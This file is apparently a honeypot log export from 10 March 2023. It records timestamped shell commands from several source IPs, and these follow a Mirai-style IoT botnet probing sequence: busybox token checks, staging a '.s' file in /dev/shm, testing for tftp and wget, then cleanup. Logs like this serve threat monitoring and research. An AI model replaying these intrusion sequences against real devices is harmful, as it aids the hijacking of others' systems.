@timestamp,input.keyword,src_ip,geoip.city_name,geoip.country_name
"Mar 10, 2023 @ 12:30:36.337",uname -a,8.213.24.214,Singapore,Singapore
"Mar 10, 2023 @ 12:16:32.670",rm .s; exit,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:32.668",/bin/busybox MJXGE,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:32.401",while read i,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:32.398",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:32.124",tftp; wget; /bin/busybox MJXGE,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.846",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MJXGE,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.561",cat /proc/mounts; /bin/busybox MJXGE,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.277",sh,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.276",shell,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.275",shell,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.275",system,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.274",system,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.272",enable,42.243.253.211,-,China
"Mar 10, 2023 @ 12:10:44.281",/bin/busybox PEIFN,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:44.047",while read i,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:44.042",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.789",tftp; wget; /bin/busybox PEIFN,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.546",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PEIFN,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.295",cat /proc/mounts; /bin/busybox PEIFN,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.054",sh,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.053",shell,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.052",shell,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.051",system,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.050",system,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.046",enable,110.178.37.27,-,China
"Mar 10, 2023 @ 11:09:45.513",uname -s -v -n -r -m,47.243.63.173,San Mateo,United States
"Mar 10, 2023 @ 10:29:59.608",rm .s; exit,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:59.552",/bin/busybox BDEXQ,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:59.328",while read i,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:59.270",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.991",tftp; wget; /bin/busybox BDEXQ,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.720",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BDEXQ,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.440",cat /proc/mounts; /bin/busybox BDEXQ,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.176",shell,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.176",sh,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.175",shell,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.124",system,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.105",system,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.103",enable,222.241.50.50,-,China
"Mar 10, 2023 @ 09:32:59.196",rm .s; exit,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:59.184",/bin/busybox EEQUZ,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.970",while read i,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.939",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.711",tftp; wget; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.459",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.218",cat /proc/mounts; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.997",sh,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.996",shell,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.995",shell,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.994",system,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.993",system,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.991",enable,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:11:52.321",/bin/busybox RVZEV,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:52.087",while read i,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:52.084",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.845",tftp; wget; /bin/busybox RVZEV,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.610",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RVZEV,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.371",cat /proc/mounts; /bin/busybox RVZEV,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.137",sh,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.137",shell,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.136",shell,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.135",system,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.134",system,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.132",enable,110.181.75.222,-,China
"Mar 10, 2023 @ 08:40:58.433",/bin/busybox LFOHI,49.70.13.51,-,China
